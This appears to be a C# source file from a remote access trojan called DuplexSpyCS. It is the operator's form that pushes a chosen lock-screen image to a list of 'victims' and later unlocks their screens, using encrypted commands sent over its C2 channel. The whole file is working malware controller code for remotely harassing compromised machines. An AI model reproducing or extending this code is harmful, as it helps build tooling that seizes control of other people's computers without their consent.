using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiLockScreen : Form
    {
        public List<Victim> l_victim;

        public frmMultiLockScreen()
        {
            InitializeComponent();
        }

        public void UpdateStatus(Victim v, string status)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = listView1.FindItemWithText(v.ID);
                if (item != null)
                {
                    item.SubItems[2].Text = status;
                }
            }));
        }

        void setup()
        {
            for (int i = 0; i < l_victim.Count; i++)
            {
                ListViewItem item = new ListViewItem(i.ToString());
                item.SubItems.Add(l_victim[i].ID);
                item.SubItems.Add("Unlock");

                listView1.Items.Add(item);
            }
        }

        private void frmMultiLockScreen_Load(object sender, EventArgs e)
        {
            setup();
        }

        //SELECT
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Filter = "Image file(*.png;*.jpg)|*.png;*.jpg";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        //LOCK
        private void button2_Click(object sender, EventArgs e)
        {
            string filename = textBox1.Text;
            for (int i = 0; i < l_victim.Count; i++)
            {
                try
                {
                    l_victim[i].encSend(2, 0, "fun|screen|lock|" + C2.ImageToBase64(filename));
                }
                catch (Exception ex)
                {

                }
            }
        }

        //UNLOCK
        private void button3_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < l_victim.Count; i++)
            {
                try
                {
                    l_victim[i].encSend(2, 0, "fun|screen|ulock");
                }
                catch (Exception ex)
                {

                }
            }
        }
    }
}
